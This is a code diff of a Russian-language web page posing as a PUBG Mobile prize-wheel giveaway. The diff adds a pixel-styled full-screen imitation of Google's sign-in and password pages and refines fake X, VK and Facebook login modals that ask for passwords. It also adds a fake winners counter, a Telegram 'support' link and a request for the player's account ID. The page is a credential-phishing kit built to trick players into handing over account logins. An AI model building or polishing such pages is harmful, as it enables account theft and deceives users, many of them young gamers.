         .x-title {
@@ -1079,7 +1599,7 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
-            transition: background 0.2s;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             font-family: Arial, sans-serif;
         }
         
@@ -1091,6 +1611,8 @@
         
         .social-login-btn:hover {
             background: #F7F9F9;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
         
         .modal-dark .social-login-btn:hover {
@@ -1140,6 +1662,7 @@
             background: white;
             color: #0F1419;
             font-family: Arial, sans-serif;
+            transition: all 0.3s;
         }
         
         .modal-dark .x-input {
@@ -1151,6 +1674,8 @@
         .x-input:focus {
             outline: none;
             border-color: #1D9BF0;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(29, 155, 240, 0.2);
         }
         
         .x-next-btn {
@@ -1165,6 +1690,7 @@
             cursor: pointer;
             margin-bottom: 20px;
             font-family: Arial, sans-serif;
+            transition: all 0.3s;
         }
         
         .modal-dark .x-next-btn {
@@ -1173,6 +1699,8 @@
         
         .x-next-btn:hover {
             background: #272C30;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
         .modal-dark .x-next-btn:hover {
@@ -1214,11 +1742,23 @@
             text-decoration: underline;
         }
         
-        /* Twitter/X модальное окно для пароля (этап 2) - ЧЕРНЫЙ ФОН */
+        /* Twitter/X модальное окно для пароля */
         .x-modal-step2 {
             background: #000000;
             color: white;
             padding: 30px;
+            animation: slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes slideInRight {
+            from {
+                opacity: 0;
+                transform: translateX(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
         }
         
         .x-step2-title {
@@ -1248,11 +1788,14 @@
             background: #000;
             color: white;
             font-family: Arial, sans-serif;
+            transition: all 0.3s;
         }
         
         .x-password-input:focus {
             outline: none;
             border-color: #1D9BF0;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(29, 155, 240, 0.2);
         }
         
         .x-login-btn {
@@ -1267,10 +1810,13 @@
             cursor: pointer;
             margin-bottom: 20px;
             font-family: Arial, sans-serif;
+            transition: all 0.3s;
         }
         
         .x-login-btn:hover {
             background: #1A8CD8;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(29, 155, 240, 0.3);
         }
         
         .x-forgot-password {
@@ -1313,6 +1859,7 @@
             height: 48px;
             margin: 0 auto 30px;
             display: block;
+            animation: logoFloat 3s ease-in-out infinite;
         }
         
         .vk-title {
@@ -1342,12 +1889,15 @@
             background: #F2F3F5;
             color: #000;
             font-family: Arial, sans-serif;
+            transition: all 0.3s;
         }
         
         .vk-input:focus {
             outline: none;
             border-color: #4A76A8;
             background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(74, 118, 168, 0.2);
         }
         
         .vk-checkbox {
@@ -1380,10 +1930,13 @@
             cursor: pointer;
             margin-bottom: 20px;
             font-family: Arial, sans-serif;
+            transition: all 0.3s;
         }
         
         .vk-submit-btn:hover {
             background: #3C658F;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(74, 118, 168, 0.3);
         }
         
         .vk-links {
@@ -1409,6 +1962,7 @@
             max-width: 400px;
             overflow: hidden;
             border-radius: 8px;
+            animation: modalAppear 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
         .fb-header {
@@ -1425,6 +1979,7 @@
             display: block;
             margin-left: auto;
             margin-right: auto;
+            animation: logoFloat 3s ease-in-out infinite;
         }
         
         .fb-content {
@@ -1442,12 +1997,14 @@
             background: white;
             color: #1C1E21;
             font-family: Arial, sans-serif;
+            transition: all 0.3s;
         }
         
         .fb-input:focus {
             outline: none;
             border-color: #1877F2;
             box-shadow: 0 0 0 2px #E7F3FF;
+            transform: translateY(-2px);
         }
         
         .fb-submit-btn {
@@ -1462,10 +2019,13 @@
             cursor: pointer;
             margin: 10px 0 20px;
             font-family: Arial, sans-serif;
+            transition: all 0.3s;
         }
         
         .fb-submit-btn:hover {
             background: #166FE5;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
         }
         
         .fb-link {
@@ -1501,327 +2061,244 @@
             cursor: pointer;
             display: block;
             font-family: Arial, sans-serif;
+            transition: all 0.3s;
         }
         
         .fb-create-btn:hover {
             background: #36A420;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(66, 183, 42, 0.3);
         }
         
-        /* Google стиль - этап 1: email (Вход) */
-        .google-email-modal {
-            padding: 40px;
-            max-width: 480px;
+        /* СТИЛИ ДЛЯ ПОЛНОЭКРАННОЙ СТРАНИЦЫ GOOGLE */
+        .google-fullscreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 3000;
+            display: none;
+            overflow-y: auto;
+            animation: googleFadeIn 0.4s ease;
+        }
+
+        @keyframes googleFadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
         }
         
-        .google-logo-container {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .google-logo-img {
-            width: 40px;
-            height: 40px;
-            margin-right: 15px;
-        }
-        
-        .google-email-title {
-            font-size: 24px;
-            font-weight: 500;
-            color: #202124;
-            font-family: Arial, sans-serif;
-            margin: 0;
-        }
-        
-        .google-email-description {
-            font-size: 16px;
-            color: #202124;
-            margin-bottom: 30px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-input-container {
-            margin-bottom: 20px;
-        }
-        
-        .google-input-label {
+        .google-fullscreen.active {
             display: block;
-            margin-bottom: 5px;
-            color: #5F6368;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
         }
         
+        .google-auth-container {
+            width: 450px;
+            padding: 40px;
+            margin: 0 auto;
+            position: relative;
+            top: 50%;
+            transform: translateY(-50%);
+            animation: googleSlideUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes googleSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(-50%) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(-50%) scale(1);
+            }
+        }
+
+        .google-logo {
+            width: 75px;
+            display: block;
+            margin-bottom: 25px;
+            animation: googleLogoFloat 4s ease-in-out infinite;
+        }
+
+        @keyframes googleLogoFloat {
+            0%, 100% {
+                transform: translateY(0) rotate(0deg);
+            }
+            25% {
+                transform: translateY(-5px) rotate(5deg);
+            }
+            75% {
+                transform: translateY(5px) rotate(-5deg);
+            }
+        }
+
+        .google-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 8px 0;
+            text-align: left;
+            color: #202124;
+        }
+
+        .google-subtitle {
+            font-size: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+            color: #202124;
+        }
+
+        .google-input-group {
+            position: relative;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        .google-input-label {
+            position: absolute;
+            top: -10px;
+            left: 12px;
+            background: #fff;
+            padding: 0 4px;
+            font-size: 12px;
+            color: #1a73e8;
+            z-index: 1;
+            animation: labelPulse 2s infinite alternate;
+        }
+
+        @keyframes labelPulse {
+            from {
+                color: #1a73e8;
+            }
+            to {
+                color: #0d47a1;
+            }
+        }
+
         .google-input {
             width: 100%;
             padding: 13px 15px;
-            border: 1px solid #DADCE0;
+            border: 1px solid #1a73e8;
             border-radius: 4px;
             font-size: 16px;
-            background: white;
-            color: #202124;
-            font-family: Arial, sans-serif;
+            box-sizing: border-box;
+            outline: none;
+            transition: all 0.3s;
         }
-        
+
         .google-input:focus {
-            outline: none;
-            border-color: #1A73E8;
+            border-color: #0d47a1;
+            box-shadow: 0 0 10px rgba(26, 115, 232, 0.3);
+            transform: translateY(-2px);
         }
-        
-        .google-forgot-link {
-            color: #1A73E8;
-            text-decoration: none;
+
+        .google-guest-mode {
             font-size: 14px;
-            margin-bottom: 20px;
-            display: block;
-            font-family: Arial, sans-serif;
+            color: #5f6368;
+            margin-top: 30px;
+            line-height: 1.4;
         }
-        
-        .google-forgot-link:hover {
-            text-decoration: underline;
-        }
-        
-        .google-guest-info {
-            font-size: 14px;
-            color: #5F6368;
-            margin-bottom: 30px;
-            line-height: 1.5;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-guest-info a {
-            color: #1A73E8;
+
+        .google-guest-mode a {
+            color: #1a73e8;
             text-decoration: none;
+            font-weight: 500;
         }
-        
-        .google-guest-info a:hover {
-            text-decoration: underline;
-        }
-        
-        .google-buttons-container-email {
+
+        .google-footer-buttons {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
+            margin-top: 40px;
         }
-        
-        .google-create-account-link {
-            color: #1A73E8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-create-account-link:hover {
-            text-decoration: underline;
-        }
-        
-        .google-next-btn-email {
-            padding: 10px 24px;
-            background: #1A73E8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 15px;
+
+        .google-btn-text {
+            color: #1a73e8;
             font-weight: 500;
             cursor: pointer;
-            font-family: Arial, sans-serif;
-            min-width: 80px;
-        }
-        
-        .google-next-btn-email:hover {
-            background: #1666D6;
-            box-shadow: 0 1px 3px rgba(66, 133, 244, 0.3);
-        }
-        
-        .google-language-email {
-            color: #5F6368;
+            background: none;
+            border: none;
             font-size: 14px;
-            font-family: Arial, sans-serif;
+            padding: 8px;
+            transition: all 0.3s;
+        }
+
+        .google-btn-text:hover {
+            color: #0d47a1;
+            transform: translateY(-2px);
+        }
+
+        .google-btn-blue {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 24px;
+            border-radius: 4px;
+            border: none;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+
+        .google-btn-blue:hover {
+            background-color: #0d47a1;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(26, 115, 232, 0.4);
+        }
+
+        .google-lang-footer {
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+        }
+
+        .google-bottom-footer {
             position: absolute;
             bottom: 20px;
-            left: 30px;
+            left: 0;
+            right: 0;
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+            padding: 20px 0;
         }
-        
-        /* Google стиль - этап 2: пароль (Добро пожаловать!) */
-        .google-modal-step2 {
-            padding: 40px;
-            max-width: 480px;
-        }
-        
-        .google-welcome-header {
+
+        .google-bottom-footer-links {
             display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .google-welcome-logo {
-            width: 40px;
-            height: 40px;
-            margin-right: 15px;
-        }
-        
-        .google-welcome-title {
-            font-size: 24px;
-            font-weight: 500;
-            color: #202124;
-            font-family: Arial, sans-serif;
-            margin: 0;
-        }
-        
-        .google-user {
-            display: flex;
-            align-items: center;
-            margin-bottom: 30px;
-            padding: 15px;
-            background: #F8F9FA;
-            border-radius: 16px;
-        }
-        
-        .google-avatar {
-            width: 40px;
-            height: 40px;
-            background: #757575;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
             justify-content: center;
-            color: white;
-            font-weight: 500;
-            margin-right: 15px;
-            font-family: Arial, sans-serif;
+            gap: 20px;
+            margin-bottom: 10px;
         }
-        
-        .google-avatar.anon {
-            background: #757575;
-        }
-        
-        .google-user-info {
-            flex: 1;
-        }
-        
-        .google-user-email {
-            font-weight: 500;
-            color: #202124;
-            font-size: 16px;
-            font-family: Arial, sans-serif;
-            margin-bottom: 5px;
-        }
-        
-        .google-switch {
-            color: #1A73E8;
+
+        .google-bottom-footer-links a {
+            color: #5f6368;
             text-decoration: none;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
-            display: flex;
-            align-items: center;
-            gap: 5px;
         }
-        
-        .google-switch:hover {
+
+        .google-bottom-footer-links a:hover {
             text-decoration: underline;
         }
-        
-        .google-password-container {
-            margin-bottom: 15px;
-            text-align: center;
-        }
-        
-        .google-password-label {
-            display: block;
-            margin-bottom: 5px;
-            color: #5F6368;
+
+        .google-show-pass {
+            display: flex;
+            align-items: center;
             font-size: 14px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-password-input {
-            width: 100%;
-            padding: 13px 15px;
-            border: 1px solid #DADCE0;
-            border-radius: 4px;
-            font-size: 16px;
-            background: white;
+            margin-top: 8px;
             color: #202124;
-            font-family: Arial, sans-serif;
-            text-align: center;
         }
-        
-        .google-password-input:focus {
-            outline: none;
-            border-color: #1A73E8;
+
+        .google-welcome-container {
+            margin-top: 10px;
+            margin-bottom: 40px;
         }
-        
-        .google-password-options {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-        }
-        
-        .google-show-password {
-            display: flex;
-            align-items: center;
-        }
-        
-        .google-show-password input {
-            margin-right: 8px;
-            width: 16px;
-            height: 16px;
-        }
-        
-        .google-show-password label {
-            color: #202124;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-forgot-password {
-            color: #1A73E8;
-            text-decoration: none;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-forgot-password:hover {
-            text-decoration: underline;
-        }
-        
-        .google-buttons-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .google-next-btn {
-            padding: 10px 24px;
-            background: #1A73E8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 15px;
-            font-weight: 500;
-            cursor: pointer;
-            font-family: Arial, sans-serif;
-            min-width: 80px;
-        }
-        
-        .google-next-btn:hover {
-            background: #1666D6;
-            box-shadow: 0 1px 3px rgba(66, 133, 244, 0.3);
-        }
-        
-        .google-language {
-            color: #5F6368;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
-            position: absolute;
-            bottom: 20px;
-            left: 30px;
-        }
-        
+
+        /* Footer */
         .footer {
             width: 100%;
             max-width: 800px;
@@ -1832,6 +2309,7 @@
             border-radius: 10px;
             border-top: 2px solid #2a3b5a;
             backdrop-filter: blur(10px);
+            animation: fadeIn 1s ease-out 0.5s both;
         }
         
         .footer-links {
@@ -1846,13 +2324,29 @@
             color: #8da1b5;
             text-decoration: none;
             font-size: 14px;
-            transition: color 0.3s;
+            transition: all 0.3s;
             font-weight: 400;
             font-family: Arial, sans-serif;
+            position: relative;
+        }
+        
+        .footer-link::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 0;
+            height: 1px;
+            background: #1877F2;
+            transition: width 0.3s;
         }
         
         .footer-link:hover {
             color: #1877F2;
+        }
+        
+        .footer-link:hover::after {
+            width: 100%;
         }
         
         .copyright {
@@ -1865,6 +2359,17 @@
         }
         
         @media (max-width: 600px) {
+            .winners-counter {
+                top: 5px;
+                right: 5px; /* Обновлено для мобильной версии */
+                padding: 6px 12px;
+                font-size: 12px;
+            }
+            
+            .winners-count {
+                font-size: 14px;
+            }
+            
             .roulette-container {
                 height: 320px;
             }
@@ -1889,14 +2394,6 @@
                 font-size: 18px;
             }
             
-            .header h1 {
-                font-size: 24px;
-            }
-            
-            .header p {
-                font-size: 14px;
-            }
-            
             .social-grid {
                 grid-template-columns: repeat(2, 1fr);
                 gap: 10px;
@@ -1909,10 +2406,6 @@
             .social-icon {
                 width: 50px;
                 height: 50px;
-            }
-            
-            .logo {
-                font-size: 18px;
             }
             
             .get-prize-btn {
@@ -1929,12 +2422,24 @@
                 max-width: 95%;
             }
             
-            .google-modal-step2 {
+            .google-auth-container {
+                width: 90%;
                 padding: 30px 20px;
+                transform: none;
+                top: 0;
+                margin-top: 40px;
+                animation: googleSlideUpMobile 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             }
-            
-            .google-email-modal {
-                padding: 30px 20px;
+
+            @keyframes googleSlideUpMobile {
+                from {
+                    opacity: 0;
+                    transform: translateY(20px);
+                }
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
             }
             
             .prize-mail-btn {
@@ -1968,15 +2473,81 @@
                 width: 180px;
                 height: 180px;
             }
+            
+            .google-bottom-footer {
+                position: relative;
+                bottom: 0;
+                margin-top: 40px;
+            }
+            
+            .top-menu {
+                padding: 10px 15px;
+                flex-wrap: wrap;
+                margin-top: 60px;
+            }
+            
+            .menu-left {
+                gap: 8px;
+            }
+            
+            .menu-btn {
+                padding: 6px 10px;
+                font-size: 12px;
+            }
+            
+            .language-btn {
+                padding: 6px 10px;
+                font-size: 12px;
+                min-width: 100px;
+            }
+            
+            .prize-mail-btn {
+                padding: 6px 10px;
+                font-size: 12px;
+            }
+            
+            .menu-right {
+                gap: 8px;
+            }
+            
+            .notification {
+                padding: 20px;
+                max-width: 90%;
+                font-size: 14px;
+            }
+            
+            .faq-section {
+                padding: 20px 15px;
+            }
+            
+            .faq-question {
+                padding: 15px;
+                font-size: 14px;
+            }
+            
+            .faq-answer {
+                font-size: 13px;
+                padding: 0 15px;
+            }
+            
+            .faq-item.active .faq-answer {
+                padding: 0 15px 15px 15px;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- Уведомление -->
+    <!-- Счетчик победителей - ОБНОВЛЕНО: теперь в правом верхнем углу -->
+    <div class="winners-counter">
+        <i class="fas fa-trophy"></i>
+        Победителей: <span class="winners-count" id="winnersCount">0</span>
+    </div>
+    
+    <!-- Уведомление в центре -->
     <div class="notification" id="notification"></div>
     
-    <!-- Окно с призом - НОВЫЙ ИНТЕРФЕЙС -->
+    <!-- Окно с призом -->
     <div class="prize-window" id="prizeWindow">
         <div class="prize-content">
             <div class="prize-banner">ВАШ ПРИЗ</div>
@@ -1995,9 +2566,70 @@
         </div>
     </div>
 
+    <!-- Полноэкранная страница Google -->
+    <div class="google-fullscreen" id="googleFullscreen">
+        <div class="google-auth-container" id="googleStep1">
+            <img src="Google.png" alt="Google" class="google-logo">
+            <h1 class="google-title">Вход</h1>
+            <p class="google-subtitle">Используйте аккаунт Google</p>
+            
+            <div class="google-input-group">
+                <span class="google-input-label">Телефон или адрес эл. почты</span>
+                <input type="text" id="googleEmailInput" class="google-input">
+            </div>
+
+            <div class="google-guest-mode">
+                Работаете на чужом компьютере? Используйте режим «Частный доступ».<br>
+                <a href="#">Подробнее об использовании гостевого режима</a>
+            </div>
+
+            <div class="google-footer-buttons">
+                <button class="google-btn-text" id="googleCreateAccountBtn">Создать аккаунт</button>
+                <button class="google-btn-blue" id="googleNextBtn">Далее</button>
+            </div>
+            
+            <div class="google-lang-footer">Русский</div>
+        </div>
+        
+        <!-- Страница пароля (скрыта по умолчанию) -->
+        <div class="google-auth-container" id="googleStep2" style="display:none;">
+            <img src="Google.png" alt="Google" class="google-logo">
+            
+            <div class="google-welcome-container">
+                <h1 class="google-title">Добро пожаловать!</h1>
+            </div>
+
+            <div class="google-input-group">
+                <span class="google-input-label">Введите пароль</span>
+                <input type="password" id="googlePasswordInput" class="google-input">
+            </div>
+            
+            <div class="google-show-pass">
+                <input type="checkbox" id="googleShowPassword"> 
+                <label for="googleShowPassword">Показать пароль</label>
+            </div>
+
+            <div class="google-footer-buttons">
+                <button class="google-btn-text" id="googleForgotPasswordBtn">Забыли пароль?</button>
+                <button class="google-btn-blue" id="googleSubmitBtn">Далее</button>
+            </div>
+            
+            <div class="google-lang-footer">Русский</div>
+        </div>
+        
+        <!-- Общий футер для всей страницы -->
+        <div class="google-bottom-footer">
+            <div class="google-bottom-footer-links">
+                <a href="#">Справка</a>
+                <a href="#">Конфиденциальность</a>
+                <a href="#">Условия</a>
+            </div>
+        </div>
+    </div>
+
     <!-- Модальные окна для входа -->
     
-    <!-- Twitter/X модальное окно (этап 1: email/username) - ЧЕРНЫЙ ФОН -->
+    <!-- Twitter/X модальное окно (этап 1: email/username) -->
     <div class="modal-overlay modal-dark" id="xModalStep1">
         <div class="modal modal-dark x-modal-step1">
             <button class="close-modal" onclick="closeModal('xModalStep1')">&times;</button>
@@ -2042,7 +2674,7 @@
         </div>
     </div>
     
-    <!-- Twitter/X модальное окно (этап 2: пароль) - ЧЕРНЫЙ ФОН -->
+    <!-- Twitter/X модальное окно (этап 2: пароль) -->
     <div class="modal-overlay modal-dark" id="xModalStep2">
         <div class="modal modal-dark x-modal-step2">
             <button class="close-modal" onclick="closeModal('xModalStep2')">&times;</button>
@@ -2056,8 +2688,7 @@
             <h2 class="x-step2-title">Введите пароль</h2>
             
             <form id="xPasswordForm">
-                <label class="x-password-label">Пароль</label>
-                <input type="password" class="x-password-input" placeholder="Пароль" required>
+                <input type="password" class="x-password-input" placeholder="Введите пароль" required>
                 
                 <button type="submit" class="x-login-btn">Войти</button>
             </form>
@@ -2133,128 +2764,58 @@
             </div>
         </div>
     </div>
-    
-    <!-- Google модальное окно (этап 1: email) - Вход -->
-    <div class="modal-overlay" id="googleModalStep1">
-        <div class="modal google-email-modal">
-            <button class="close-modal" onclick="closeModal('googleModalStep1')">&times;</button>
-            
-            <div class="google-logo-container">
-                <img src="google.png" alt="Google" class="google-logo-img">
-                <h1 class="google-email-title">Вход</h1>
-            </div>
-            
-            <div class="google-email-description">
-                Используйте аккаунт Google
-            </div>
-            
-            <form id="googleEmailForm">
-                <div class="google-input-container">
-                    <label class="google-input-label">Телефон или адрес эл. почты</label>
-                    <input type="email" class="google-input" required>
-                </div>
-                
-                <a href="#" class="google-forgot-link">Забыли адрес электронной почты?</a>
-                
-                <div class="google-guest-info">
-                    Работаете на чужом компьютере? Используйте режим «Частный доступ». <a href="#">Подробнее об использовании гостевого режима</a>
-                </div>
-                
-                <div class="google-buttons-container-email">
-                    <a href="#" class="google-create-account-link">Создать аккаунт</a>
-                    <button type="submit" class="google-next-btn-email">Далее</button>
-                </div>
-            </form>
-            
-            <div class="google-language-email">
-                Русский
-            </div>
-        </div>
-    </div>
-    
-    <!-- Google модальное окно (этап 2: пароль) - Добро пожаловать! -->
-    <div class="modal-overlay" id="googleModalStep2">
-        <div class="modal google-modal-step2">
-            <button class="close-modal" onclick="closeModal('googleModalStep2')">&times;</button>
-            
-            <div class="google-welcome-header">
-                <img src="google.png" alt="Google" class="google-welcome-logo">
-                <h2 class="google-welcome-title">Добро пожаловать!</h2>
-            </div>
-            
-            <div class="google-user">
-                <div class="google-avatar anon">
-                    <i class="fas fa-user"></i>
-                </div>
-                <div class="google-user-info">
-                    <div class="google-user-email" id="googleUserEmail">demo@gmail.com</div>
-                    <a href="#" class="google-switch" onclick="switchGoogleAccount()">
-                        <i class="fas fa-user-circle"></i> Сменить аккаунт
-                    </a>
-                </div>
-            </div>
-            
-            <form id="googlePasswordForm">
-                <div class="google-password-container">
-                    <label class="google-password-label">Введите пароль</label>
-                    <input type="password" class="google-password-input" placeholder="Пароль" required>
-                </div>
-                
-                <div class="google-password-options">
-                    <div class="google-show-password">
-                        <input type="checkbox" id="showPassword">
-                        <label for="showPassword">Показать пароль</label>
-                    </div>
-                    
-                    <a href="#" class="google-forgot-password">Забыли пароль?</a>
-                </div>
-                
-                <div class="google-buttons-container">
-                    <a href="#" class="google-forgot-password" style="visibility: hidden;">Забыли пароль?</a>
-                    <button type="submit" class="google-next-btn">Далее</button>
-                </div>
-            </form>
-            
-            <div class="google-language">
-                Русский
-            </div>
-        </div>
-    </div>
 
     <!-- Верхнее меню -->
     <div class="top-menu">
-        <div class="language-menu">
-            <button class="language-btn" id="languageBtn">
-                <i class="fas fa-globe"></i> Русский <i class="fas fa-chevron-down"></i>
-            </button>
-            <div class="language-dropdown" id="languageDropdown">
-                <div class="language-option" data-lang="uz">O'zbekcha</div>
-                <div class="language-option" data-lang="en">English</div>
-                <div class="language-option" data-lang="kz">Қазақша</div>
-                <div class="language-option" data-lang="ar">العربية</div>
-                <div class="language-option" data-lang="zh">中文</div>
-                <div class="language-option" data-lang="ky">Кыргызча</div>
-                <div class="language-option" data-lang="dag">Дагестанский</div>
-                <div class="language-option" data-lang="che">Чеченский</div>
-                <div class="language-option" data-lang="az">Azərbaycanca</div>
-                <div class="language-option" data-lang="hy">Հայերեն</div>
-                <div class="language-option" data-lang="jp">日本語</div>
-                <div class="language-option" data-lang="uk">Українська</div>
+        <div class="menu-left">
+            <div class="menu-dropdown">
+                <button class="menu-btn" id="menuBtn">
+                    <i class="fas fa-bars"></i> Меню
+                </button>
+                <div class="dropdown-menu" id="dropdownMenu">
+                    <a href="https://t.me/helpumgmbot" target="_blank" class="dropdown-item">
+                        <i class="fab fa-telegram"></i> Поддержка
+                    </a>
+                    <a href="https://www.instagram.com/pubgmcis" target="_blank" class="dropdown-item">
+                        <i class="fab fa-instagram"></i> Instagram
+                    </a>
+                </div>
             </div>
         </div>
-        <div class="logo">PUBG MOBILE</div>
-        <div class="prize-mail-icon">
-            <button class="prize-mail-btn" id="prizeMailBtn">
-                <i class="fas fa-gift"></i> Мой приз
-                <div class="prize-badge" id="prizeBadge">0</div>
-            </button>
+        
+        <div class="menu-right">
+            <div class="language-menu">
+                <button class="language-btn" id="languageBtn">
+                    <i class="fas fa-globe"></i> Русский <i class="fas fa-chevron-down"></i>
+                </button>
+                <div class="language-dropdown" id="languageDropdown">
+                    <div class="language-option" data-lang="uz">O'zbekcha</div>
+                    <div class="language-option" data-lang="en">English</div>
+                    <div class="language-option" data-lang="kz">Қазақша</div>
+                    <div class="language-option" data-lang="ar">العربية</div>
+                    <div class="language-option" data-lang="zh">中文</div>
+                    <div class="language-option" data-lang="ky">Кыргызча</div>
+                    <div class="language-option" data-lang="dag">Дагестанский</div>
+                    <div class="language-option" data-lang="che">Чеченский</div>
+                    <div class="language-option" data-lang="az">Azərbaycanca</div>
+                    <div class="language-option" data-lang="hy">Հայերեն</div>
+                    <div class="language-option" data-lang="jp">日本語</div>
+                    <div class="language-option" data-lang="uk">Українська</div>
+                </div>
+            </div>
+            
+            <div class="prize-mail-icon">
+                <button class="prize-mail-btn" id="prizeMailBtn">
+                    <i class="fas fa-gift"></i> Мой приз
+                    <div class="prize-badge" id="prizeBadge">0</div>
+                </button>
+            </div>
         </div>
     </div>
 
     <div class="container">
         <div class="header">
-            <h1>КОЛЕСО УДАЧИ PUBG</h1>
-            <p>Испытай удачу и выиграй эксклюзивные призы!</p>
+            <!-- Удален текст "КОЛЕСО УДАЧИ PUBG" -->
         </div>
         
         <div class="roulette-container">
@@ -2288,7 +2849,7 @@
                 </div>
             </div>
             
-            <!-- Уменьшенная рамка с индикатором -->
+            <!-- Рамка с индикатором -->
             <div class="selection-frame" id="selectionFrame">
                 <div class="corner corner-tl"></div>
                 <div class="corner corner-tr"></div>
@@ -2301,6 +2862,21 @@
         <button class="play-btn" id="playBtn">
             <i class="fas fa-play"></i> ИГРАТЬ
         </button>
+        
+        <!-- Форма ввода ID аккаунта -->
+        <div class="account-id-section" id="accountIdSection">
+            <h2>ВВЕДИТЕ ID АККАУНТА PUBG</h2>
+            <p>Пожалуйста, введите ваш ID аккаунта PUBG Mobile для получения приза</p>
+            
+            <div class="id-input-container">
+                <label class="id-label">ID аккаунта PUBG:</label>
+                <input type="text" class="id-input" id="accountIdInput" placeholder="Введите ваш ID аккаунта" required>
+            </div>
+            
+            <button class="id-submit-btn" id="idSubmitBtn">
+                <i class="fas fa-check"></i> ПРОДОЛЖИТЬ
+            </button>
+        </div>
         
         <!-- Форма выбора соцсети -->
         <div class="social-select-section" id="socialSelectSection">
@@ -2318,7 +2894,7 @@
                 <div class="social-option" data-social="facebook" onclick="openModal('facebookModal')">
                     <div class="social-icon">
                         <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="#1877F2">
-                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                         </svg>
                     </div>
                     <span>Facebook</span>
@@ -2326,12 +2902,12 @@
                 
                 <div class="social-option" data-social="x" onclick="openXModal()">
                     <div class="social-icon">
-                        <img src="twiter.png" alt="Twitter">
+                        <img src="twiter.png" alt="X">
                     </div>
-                    <span>Twitter/X</span>
+                    <span>X</span>
                 </div>
                 
-                <div class="social-option" data-social="google" onclick="openGoogleModal()">
+                <div class="social-option" data-social="google" onclick="openGoogleFullscreen()">
                     <div class="social-icon">
                         <img src="google.png" alt="Google">
                     </div>
@@ -2339,13 +2915,13 @@
                 </div>
             </div>
             
+            <div class="important-note" id="importantNote">
+                <strong>Важно:</strong> Приз будет зачислен на ваш аккаунт в течение 24 часов
+            </div>
+            
             <button class="get-prize-btn" id="getPrizeBtn">
                 <i class="fas fa-paper-plane"></i> ПОЛУЧИТЬ ПРИЗ
             </button>
-            
-            <p style="text-align: center; color: #8da1b5; font-size: 14px; margin-top: 15px; font-family: Arial, sans-serif;">
-                <strong>Важно:</strong> Приз будет зачислен на ваш аккаунт в течение 24 часов
-            </p>
         </div>
         
